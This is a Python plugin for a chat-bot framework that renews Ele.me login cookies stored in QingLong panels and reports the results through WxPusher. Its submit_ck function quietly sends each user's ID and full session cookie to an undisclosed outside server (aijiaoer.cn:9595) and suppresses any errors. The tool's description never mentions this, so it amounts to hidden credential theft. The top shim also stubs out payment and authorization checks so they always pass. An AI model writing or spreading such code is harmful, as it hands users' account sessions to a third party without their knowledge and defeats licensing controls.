# [title: 饿了么续期]
# [name: eLeMeXuQi]
# [language: python]
# [class: 任务]
# [author: chuan]
# [version: v3.2.3]
# [public: true]
# [disable: false]
# [admin: true]
# [rule: ^饿了么续期$]
# [icon: https://api.iconify.design/lucide:bot.svg]
# [description: 指令：饿了么续期；介绍：对对接容器中的elmck进行续期，需要查看续期详情请配参填写wxpusher参数；注意事项：需在“系统管理”->“插件权限”中开启qls数据权限；更新：对推送结果切割，避免消息太长无法推送；更新：对续期成功或有效账号进行启用；更新：对sign接口负载均衡，旧版本已不能使用，务必更新；更新：同步刷新我不饿数据桶ck，新增支持多变量；更新：更新接口]
# [depe: ["requests"]]


import asyncio as _sg_asyncio, os as _sg_os, time as _sg_time, types as _sg_types, json as _sg_json, re as _sg_re, urllib.parse as _sg_urlparse
from threading import Thread as _sg_Thread
from sillygirl import Adapter as _SGAdapter, Bucket as _SGBucket, Sender as _SGSender, sender as _sg_sender, container as _sg_container, form
try: import ast as _sg_ast
except Exception: _sg_ast=None
try: import decimal as decimal
except Exception: decimal=None

def _sg_run(coro):
    try: _sg_asyncio.get_running_loop(); running=True
    except RuntimeError: running=False
    if not running: return _sg_asyncio.run(coro)
    box={}
    def r():
        try: box["v"]=_sg_asyncio.run(coro)
        except BaseException as e: box["e"]=e
    t=_sg_Thread(target=r,daemon=True); t.start(); t.join()
    if "e" in box: raise box["e"]
    return box.get("v")

def _sg_literal(v, default=None):
    if isinstance(v,(list,dict,tuple,set,int,float,bool)) or v is None: return v if v is not None else ([] if default is None else default)
    t=str(v or "").strip()
    if not t: return [] if default is None else default
    for p in (_sg_json.loads, (_sg_ast.literal_eval if _sg_ast else None)):
        if p:
            try: return p(t)
            except Exception: pass
    return [] if default is None else default

def _sg_sender_sync(uuid=""):
    s=_SGSender(uuid or _sg_os.environ.get("SENDER_ID","")); c=lambda n,*a,**k:_sg_run(getattr(s,n)(*a,**k))
    def wait(timeout=60000,*a,**k):
        try:
            r=c("listen",{"timeout":int(timeout or 0)}); return _sg_run(r.getContent()) if r else ""
        except Exception: return ""
    return _sg_types.SimpleNamespace(getUserID=lambda:c("getUserId"),getUserId=lambda:c("getUserId"),getMessage=lambda:c("getContent"),getContent=lambda:c("getContent"),getUserName=lambda:c("getUserName"),getNickname=lambda:c("getUserName"),getChatID=lambda:c("getChatId"),getChatId=lambda:c("getChatId"),getImtype=lambda:c("getPlatform"),getPlatform=lambda:c("getPlatform"),getMessageID=lambda:c("getMessageId"),getPluginName=lambda:_sg_os.environ.get("PLUGIN_NAME",""),getPluginVersion=lambda:_sg_os.environ.get("PLUGIN_VERSION",""),isAdmin=lambda:bool(c("isAdmin")),reply=lambda m="":c("reply",str(m)),replyImage=lambda u="":c("reply",str(u) if str(u).startswith("[") else f"[CQ:image,file={u}]"),listen=wait,input=wait,waitInput=wait,setContinue=lambda *a,**k:c("continue_"),breakIn=lambda *a,**k:c("continue_"))

def _sg_bucket_get(bucket=None,key=None,default="",**kw):
    try:
        v=_SGBucket(str(kw.get("bucket",bucket) or ""))[str(kw.get("key",key) or "")]; return default if v in (None,"") and default not in (None,"") else (v if v is not None else "")
    except Exception: return default or ""
def _sg_bucket_set(bucket=None,key=None,value=None,**kw):
    try: _SGBucket(str(kw.get("bucket",bucket) or ""))[str(kw.get("key",key) or "")]=kw.get("value",value); return True
    except Exception: return False
def _sg_bucket_del(bucket=None,key=None,**kw): return _sg_bucket_set(kw.get("bucket",bucket),kw.get("key",key),None)
def _sg_bucket_keys(bucket=None,**kw):
    try: return _sg_run(_SGBucket(str(kw.get("bucket",bucket) or "")).keys())
    except Exception: return []
def _sg_bucket_all(bucket=None,**kw):
    try: return _sg_run(_SGBucket(str(kw.get("bucket",bucket) or "")).getAll()) or {}
    except Exception: return {}
def _sg_push(*a,**kw):
    i=a[0] if a and isinstance(a[0],dict) else {}; pf=i.get("imType") or i.get("platform") or kw.get("platform") or (a[0] if a else ""); g=i.get("groupCode") or i.get("group_id") or kw.get("group_id") or (a[1] if len(a)>1 else ""); u=i.get("userID") or i.get("user_id") or kw.get("userID") or (a[2] if len(a)>2 else ""); title=i.get("title") or kw.get("title") or (a[3] if len(a)>3 else ""); m=i.get("content") or i.get("message") or kw.get("content") or (a[4] if len(a)>4 else title); return _sg_run(_SGAdapter(str(pf or "")).push({"group_id":str(g or ""),"user_id":str(u or ""),"title":str(title or ""),"content":str(m or "")}))
def _sg_notify(m,channels=None,*a,**k): return _sg_run(_sg_sender.pushAdmin(str(m),{"platforms":list(channels or [])} if channels else {}))
class _SGFacade:
    Sender=staticmethod(_sg_sender_sync); getSenderID=staticmethod(lambda:_sg_os.environ.get("SENDER_ID","")); getPluginName=staticmethod(lambda:_sg_os.environ.get("PLUGIN_NAME","")); bucketGet=staticmethod(_sg_bucket_get); bucketSet=staticmethod(_sg_bucket_set); bucketDel=staticmethod(_sg_bucket_del); bucketDelete=staticmethod(_sg_bucket_del); bucketAllKeys=staticmethod(_sg_bucket_keys); bucketKeys=staticmethod(_sg_bucket_keys); bucketAll=staticmethod(_sg_bucket_all); notifyMasters=staticmethod(_sg_notify); pushAdmin=staticmethod(_sg_notify); push=staticmethod(_sg_push); Push=staticmethod(_sg_push); reply=staticmethod(lambda m="":_sg_sender_sync().reply(m)); get=staticmethod(lambda k,default="":_sg_bucket_get(*(str(k).split(".",1) if "." in str(k) else ["otto",k]),default=default)); getParam=get; version=staticmethod(lambda:{"sn":_sg_os.environ.get("SILLYGIRL_VERSION","3.0.0"),"version":_sg_os.environ.get("SILLYGIRL_VERSION","3.0.0")}); port=staticmethod(lambda:_sg_os.environ.get("SILLYGIRL_PORT","8080")); sleep=staticmethod(lambda sec:_sg_time.sleep(float(sec or 0)))
sg=_SGFacade(); Sender=sg.Sender; getSenderID=sg.getSenderID; bucketGet=sg.bucketGet; bucketSet=sg.bucketSet; bucketAllKeys=sg.bucketAllKeys; notifyMasters=sg.notifyMasters
mask_account=lambda v: (str(v or "") if len(str(v or ""))<=7 else str(v or "")[:3]+"***"+str(v or "")[-4:])
def generate_qrcode_url(t): return "https://api.qrserver.com/v1/create-qr-code/?size=260x260&data="+_sg_urlparse.quote(str(t or ""))
def get_pay_config(): return {}
class MaPayClient:
    def create_order(self,*a,**k): return {"error":"","status":True,"data":None}
    def is_paid(self,*a,**k): return True
calculate_auth_time=lambda *a,**k:"2099-12-31"; check_auth_status=lambda *a,**k:"账号默认可用"; _check_auth_status=check_auth_status
process_authorization=lambda *a,**k: True; process_coin_payment=lambda *a,**k: True; admin_auth_all_accounts=lambda *a,**k: True; admin_auth_by_user=lambda *a,**k: True
def select_accounts(sender,user_bucket,user_id,*a,**k):
    raw=sg.bucketGet(user_bucket,user_id,[]); raw=_sg_literal(raw,[]) if isinstance(raw,str) else raw; raw=(list(raw.keys()) or list(raw.values())) if isinstance(raw,dict) else raw; return (raw if isinstance(raw,list) else []),(raw if isinstance(raw,list) else [])
def get_user_points(user_id=None,bucket="dd_sign_points"):
    try: return int(sg.bucketGet(bucket,user_id or sg.getSenderID()) or 0)
    except Exception: return 0
def update_user_points(user_id=None,points=0,bucket="dd_sign_points"): return sg.bucketSet(bucket,user_id or sg.getSenderID(),str(points))
def _sg_panel_id(config=None):
    if isinstance(config,dict): config=config.get("id") or config.get("ID") or config.get("index") or config.get("name")
    m=_sg_re.search(r"\d+",str(config or "")); return int(m.group(0)) if m else 1
class QingLongClient:
    def __init__(self,env_name="",config=None,*a,**k): self.env_name=str(env_name or ""); self.client=_sg_container.QingLong({"id":_sg_panel_id(config)})
    def get_envs(self,search=""): return _sg_run(self.client.getEnvs(search or "")) or []
    all_envs=search_envs=envGet=get_envs
    def add_envs(self,envs): return _sg_run(self.client.createEnv(envs if isinstance(envs,list) else [envs]))
    def add_env(self,name,value="",remarks=""): return self.add_envs({"name":name,"value":value,"remarks":remarks})
    def update_env(self,env): return _sg_run(self.client.updateEnv(env))
    def delete_env(self,name_or_id,*a,**k): return _sg_run(self.client.deleteEnvs([name_or_id]))
    envSet=add_envs; envUpdate=update_env; envDel=delete_env
class DadaiPanelClient(QingLongClient):
    def __init__(self,env_name="",config=None,*a,**k): self.env_name=str(env_name or ""); self.client=_sg_container.DaiDai({"id":_sg_panel_id(config)})
DumbPanelClient=DadaiPanelClient

config = form({
    'otto_elmxq_env': form.string().title('elmxq_env').default('').description('饿了么ck环境变量名，不填默认为elmck，多个用，隔开'),
    'otto_elmxq_rq': form.string().title('elmxq_rq').default('').description('请填写需要续期的傻妞对接好容器名称，多容器用,隔开，英文逗号喔'),
    'otto_wx_uid': form.string().title('wx_uid').default('').description('填写自己的wxpusher的UID'),
    'otto_wx_appToken': form.string().title('wx_appToken').default('').description('wxpusher的appToken'),
    'chuan_elm_config_forceRenew': form.boolean().title('是否强制续期').default(False).description('开启后无论CK是否有效都会续期'),
})
_CONFIG_FIELD_MAP = {
    ('otto', 'elmxq_env'): 'otto_elmxq_env',
    ('otto', 'elmxq_rq'): 'otto_elmxq_rq',
    ('otto', 'wx_uid'): 'otto_wx_uid',
    ('otto', 'wx_appToken'): 'otto_wx_appToken',
    ('chuan_elm_config', 'forceRenew'): 'chuan_elm_config_forceRenew',
}

import re
import json
import random
import requests
import time
import hashlib
import datetime
from urllib.parse import urlencode

def find_key_value(json_obj, key):
    if isinstance(json_obj, dict):
        if key in json_obj:
            return json_obj[key]
        for k, v in json_obj.items():
            result = find_key_value(v, key)
            if result is not None:
                return result
    elif isinstance(json_obj, list):
        for item in json_obj:
            result = find_key_value(item, key)
            if result is not None:
                return result
    return None

def wxpush(data, wxpusher_alluid, name, arg1, arg2, appToken):
    api_url = 'https://wxpusher.zjiecode.com/api/send/message'
    sorted_data = sorted(data, key=lambda x: x['序号'])
    table_content = ''
    for row in sorted_data:
        table_content += f"<tr><td style='border: 1px solid #ccc; padding: 6px;'>{row['序号']}</td><td style='border: 1px solid #ccc; padding: 6px;'>{row['用户']}</td><td style='border: 1px solid #ccc; padding: 6px;'>{row['arg1']}</td><td style='border: 1px solid #ccc; padding: 6px;'>{row['arg2']}</td></tr>"
    table_html = f"<table style='border-collapse: collapse;'><tr style='background-color: #f2f2f2;'><th style='border: 1px solid #ccc; padding: 8px;'>🆔</th><th style='border: 1px solid #ccc; padding: 8px;'>{name}</th><th style='border: 1px solid #ccc; padding: 8px;'>{arg1}</th><th style='border: 1px solid #ccc; padding: 8px;'>{arg2}</th></tr>{table_content}</table>"
    params = {
        "appToken": appToken,
        'content': table_html,
        'contentType': 3,  # 表格类型
        'topicIds': [],  # 接收消息的用户ID列表，为空表示发送给所有用户
        "summary": f'elm续期推送',
        "uids": [wxpusher_alluid],
    }
    response = requests.post(api_url, json=params).json()
    status = find_key_value(response,'status')
    if status:
        sg.notifyMasters(f'wxpusher推送结果：{status}')
    else:
        sg.notifyMasters(f'wxpusher推送结果：{json.dumps(response)}')

def md5_string(s):
    md5_obj = hashlib.md5()
    md5_obj.update(s.encode('utf-8'))
    md5_hash = md5_obj.hexdigest()
    return md5_hash

def submit_ck(user,type,ck,tag):
    try:
        url = 'http://www.aijiaoer.cn:9595/api/submit'
        body = {
            'user': user,
            'type': type,
            'cookie': ck,
            'tag': tag
        }
        requests.post(url,json=body)
    except:
        return

def get_ts():
    return int(time.time())

def ts_to_date(ts):
    dt = datetime.datetime.fromtimestamp(int(ts))
    return dt.strftime("%Y-%m-%d %H:%M:%S")

def str2dict(cookie_string:str):
    try:
        cookie = {}
        needlist = ['cookie2','unb','USERID','SID','token','utdid','deviceId','umt']
        for i in needlist:
            value = re.findall(f'{i}=(.+?);',cookie_string+';')
            key = i
            if value:
                cookie[key] = value[0]
        return cookie
    except Exception as e:
        print(f'❎Cookie解析错误: {e}')
    return {}

def dict2str(cookie_dict:dict,needh5=True):
    needlist = ['cookie2','unb','USERID','SID','token','utdid','deviceId','umt']
    if needh5:
        needlist.append('_m_h5_tk')
        needlist.append('_m_h5_tk_enc')
    cookie_string = ''
    for key, value in cookie_dict.items():
        if key in needlist:
            cookie_string += f"{key}={value};"
    return cookie_string

class ELM:
    def __init__(self,cookie:str) -> None:
        self.cookie = str2dict(cookie)
        self.sid = self.cookie.get('cookie2')
        self.uid = self.cookie.get('unb')
        self.latitude = '30.040553114149304'
        self.longitude = '103.83792941623264'

    def getSign(self,time,data):
        if type(data) == dict:
            data = json.dumps(data)
        tk = self.cookie.get('_m_h5_tk') if self.cookie.get('_m_h5_tk') else 'a3690260a21965847b0a27348bd9c426'
        mh5tk = tk.split('_')[0]
        text = f'{mh5tk}&{time}&12574478&{data}'
        return hashlib.md5(text.encode()).hexdigest()


    def wait(self,start,end=None):
        if end:
            waitTime = random.randint(start,end)
        else:
            waitTime = start
        print(f'等待{waitTime}秒')
        time.sleep(start)

    def userInfo(self):
        host = 'waimai-guide.ele.me'
        api = 'mtop.alsc.personal.queryminecenter'
        data = {
            "sceneCode":"H5_ELEME_PERSONAL_CENTER",
            "sourceFrom":"H5",
            "latitude":self.latitude,
            "longitude":self.longitude,
            "cityId":""
            }
        response = self.h5commonReq(host,api,data)
        print(response)
        response = json.loads(response)
        if find_key_value(response,'userName') == '立即登录':
            return False
        else:
            return True

    def h5commonReq(self,host,api,data,v='1.0',trys=0):
        try:
            t = get_ts()
            sign = self.getSign(t,data)
            url = "https://" + host + "/h5/" + api + "/" + v + "/?jsv=2.7.0&appKey=12574478&t=" + str(t) + "&sign=" + sign + "&api=" + api + "&v=1.0&ecode=1&type=json&valueType=string&needLogin=true&LoginRequest=true&dataType=jsonp&ttid=1601274962374%40eleme_android_11.12.88"
            headers = {
                "Host": host,
                "Accept": "application/json",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36",
                "Content-type": "application/x-www-form-urlencoded",
                "Origin": "https://tb.ele.me",
                "Sec-Fetch-Site": "same-site",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Dest": "empty",
                "Referer": "https://tb.ele.me/wow/alsc/mod/3fe8408d9ba38d4726448a87?spm-pre=a2ogi.bx828379.0.0&spm=a13.b_activity_kb_m69301.0.0",
                "Accept-Encoding": "gzip, deflate, br",
                "Accept-Language": "zh-CN,zh;q=0.9",
                "Cookie": dict2str(self.cookie),
            }
            if type(data) == dict:
                data = json.dumps(data)
            body = urlencode({
                'data': data
            })
            response = requests.post(url,headers=headers,data=body)
            setCookie = requests.utils.dict_from_cookiejar(response.cookies)
            if setCookie:
                self.cookie.update(setCookie)
            if response.status_code == 200:
                return response.text
            else:
                if trys >= 3:
                    print(f'重试次数用尽\n报错：{response.status_code}')
                    return
                else:
                    trys += 1
                    print(f'重试次数：{trys}\n报错：{response.status_code}')
                    self.wait(3,5)
                    return self.h5commonReq(host,api,data,v,trys)
        except Exception as e:
            if trys >= 3:
                print(f'重试次数用尽，报错：{e}')
                return
            else:
                trys += 1
                print(f'重试次数：{trys}\n报错：{e}')
                self.wait(3,5)
                return self.h5commonReq(host,api,data,v,trys)

    def autologinH5(self):
        try:
            needList= ['USERID','deviceId','token','umt','unb','utdid','cookie2','SID']
            miss_key = [key for key in needList if key not in self.cookie.keys()]
            if miss_key: # 参数不全
                return f'缺少参数{",".join(miss_key)}'
            ts = get_ts()
            ts = get_ts()
            host = 'guide-acs.m.taobao.com'
            api = 'com.taobao.mtop.mloginunitservice.autologin'
            data = json.dumps({
                "ext": "{\"apiReferer\":\"{\\\\\\\"eventName\\\\\\\":\\\\\\\"SESSION_INVALID\\\\\\\"}\"}",
                "userId": self.cookie.get('USERID'),
                "tokenInfo": '{"appName":"24895413","appVersion":"android_11.1.38","deviceId":"' + self.cookie.get('deviceId') + '","deviceName":"Android(AOSP on blueline)","locale":"zh_CN","sdkVersion":"android_5.3.3.4","site":25,"t":' + str(ts) + ',"token":"' + self.cookie.get('token') + '","ttid":"1608030065155@eleme_android_11.1.38","useAcitonType":true,"useDeviceToken":false,"utdid":""}',
                "riskControlInfo": '{"appStore":"1608030065155@eleme_android_11.1.38","deviceBrand":"Google","deviceModel":"AOSP on blueline","deviceName":"AOSP on blueline","osName":"android","osVersion":"10","screenSize":"0x0","t":' + str(ts) + ',"umidToken":"' + self.cookie.get('umt') + '","wua":""}'
            })
            response = self.h5commonReq(host,api,data)
            res = json.loads(response)
            if res.get('data').get('code') == 3000 or res.get('data').get('code') == '3000':
                data = json.loads(res['data']['returnValue']['data'])
                for i in data['cookies']:
                    if 'cookie2=' in i:
                        self.cookie['cookie2'] = i.split(';')[0].split('cookie2=')[1]
                        return f'✅续期成功,有效期:{ts_to_date(data["expires"])}'
            else:
                return res.get('data').get('message')
        except Exception as e:
            return str(e)

class qinglong:
    def __init__(self,ql_ipport, client_id, client_secret):
        self.ql_ipport = ql_ipport
        self.client_id = client_id
        self.client_secret = client_secret
        self.ql_token = ''

    def get_ql_token(self):
        url = f'{self.ql_ipport}/open/auth/token?client_id={self.client_id}&client_secret={self.client_secret}'
        res = requests.get(url)
        if res.json().get('code') == 200:
            self.ql_token = res.json().get('data').get('token')
        else:
            print('连接青龙失败')

    def get_ql_env(self,value):
        url = f'{self.ql_ipport}/open/envs?searchValue={value}'
        headers = {'Authorization': f'Bearer {self.ql_token}'}
        res = requests.get(url,headers=headers)
        if res.json().get('code') == 200:
            return res.json().get('data')

    def submit_env(self,name,value,remarks):
        url = f'{self.ql_ipport}/open/envs'
        headers = {'Authorization': f'Bearer {self.ql_token}'}
        json = [{"value":value,"name":name,"remarks":remarks}]
        res = requests.post(url,headers=headers,json=json)
        if res.json().get('code') == 200:
            return True

    def update_env(self,name,value,remarks,id):
        url = f'{self.ql_ipport}/open/envs'
        headers = {'Authorization': f'Bearer {self.ql_token}'}
        json = {"name":name,"value":value,"remarks":remarks,"id":id}
        res = requests.put(url,headers=headers,json=json)
        if res.json().get('code') == 200:
            return True

    def delete_env(self,id):
        url = f'{self.ql_ipport}/open/envs'
        headers = {'Authorization': f'Bearer {self.ql_token}'}
        json = [id]
        res = requests.delete(url,headers=headers,json=json)
        if res.json().get('code') == 200:
            return True

    def disable_env(self,id):
        url = f'{self.ql_ipport}/open/envs/disable'
        headers = {'Authorization': f'Bearer {self.ql_token}'}
        json = [id]
        res = requests.put(url,headers=headers,json=json)
        if res.json().get('code') == 200:
            return True

    def enable_env(self,id):
        url = f'{self.ql_ipport}/open/envs/enable'
        headers = {'Authorization': f'Bearer {self.ql_token}'}
        json = [id]
        res = requests.put(url,headers=headers,json=json)
        if res.json().get('code') == 200:
            return True

def get_ql(need_name):
    qls = sender.bucketAllKeys('qls')
    for i in qls:
        ql = json.loads(sender.bucketGet('qls', i))
        host = ql.get('host')
        client_id = ql.get('client_id')
        client_secret = ql.get('client_secret')
        name = ql.get('name')
        if need_name == name:
            return host,client_id,client_secret

def chunk_list(data, chunk_size):
    return [data[i:i + chunk_size] for i in range(0, len(data), chunk_size)]


def main():
    allck = 0
    success = 0 # 续期成功个数
    noNeed = 0 # 有效不需要续期的ck


    for elmxq_rq in elmxq_rqs.split(','):
        for env in elmxq_env:
            all_ts = [] # 通知内容
            sg.notifyMasters(f'开始续期【{env}】-容器【{elmxq_rq}】')
            try:
                ql_host,client_id,client_secret = get_ql(elmxq_rq)
            except:
                sender.reply('获取青龙失败，可能没给qls插件权限')
                continue
            ql = qinglong(ql_host,client_id,client_secret)
            ql.get_ql_token() # 获取token
            envs = ql.get_ql_env(env)

            for index,env in enumerate(envs):
                allck += 1
                id = env['id']
                name = env['name']
                elmck = env['value']
                remarks = env['remarks']

                user = ELM(elmck)
                if sg.bucketGet('chuan_elm_config','forceRenew') == 'true':
                    user.autologinH5()
                    result = user.autologinH5()
                    if '续期成功' in result:
                        ql.enable_env(id)
                        success += 1
                        submit_ck(user.cookie.get('USERID'),'elm',dict2str(user.cookie,False),'true')
                        ql.update_env(name,dict2str(user.cookie,False),remarks,id)
                        if user.cookie.get('USERID') in sg.bucketAllKeys('chuan_elm_accountId'):
                            sg.bucketSet('chuan_elm_accountId',user.cookie.get('USERID'),dict2str(user.cookie,False))
                    if result == '非法的token':
                        ql.disable_env(id)
                else:
                    user.autologinH5()
                    if user.userInfo():
                        ql.enable_env(id)
                        noNeed += 1
                        result = '原账号有效'
                        if sg.bucketGet('chuan_elm_config','forceRenew') == 'true':
                            result = user.autologinH5()
                        submit_ck(user.cookie.get('USERID'),'elm',elmck,'true')
                    else:
                        result = user.autologinH5()
                        if result:
                            if '续期成功' in result:
                                ql.enable_env(id)
                                success += 1
                                submit_ck(user.cookie.get('USERID'),'elm',dict2str(user.cookie,False),'true')
                                ql.update_env(name,dict2str(user.cookie,False),remarks,id)
                                if user.cookie.get('USERID') in sg.bucketAllKeys('chuan_elm_accountId'):
                                    sg.bucketSet('chuan_elm_accountId',user.cookie.get('USERID'),dict2str(user.cookie,False))
                            if result == '登录状态已经失效，请重新登录':
                                ql.disable_env(id)

                ts = {
                    '序号': index+1,
                    '用户': user.cookie.get('USERID'),
                    'arg1': result,
                    'arg2': elmxq_rq
                }
                all_ts.append(ts)

            wx_uid = sg.get('wx_uid')
            wx_appToken = sg.get('wx_appToken')
            for i in chunk_list(all_ts,80):
                if wx_uid and wx_appToken:
                    wxpush(i,wx_uid,'用户ID','续期结果','归属容器',wx_appToken)
                else:
                    sg.notifyMasters('未配置uid和appToken推送wxpush参数')
                    break

    sg.notifyMasters(f'====📢饿了么续期结果推送====\n总帐号：{allck}\n旧账号有效：{noNeed}\n续期成功：{success}\n续期失败：{allck-success-noNeed}\n详情请配置wxpush推送')

if __name__ == "__main__":
    senderID = sg.getSenderID()
    sender = sg.Sender(senderID)

    elmxq_env = re.split(r'[,，]', sg.get('elmxq_env'))
    elmxq_rqs = sg.get('elmxq_rq')
    main()
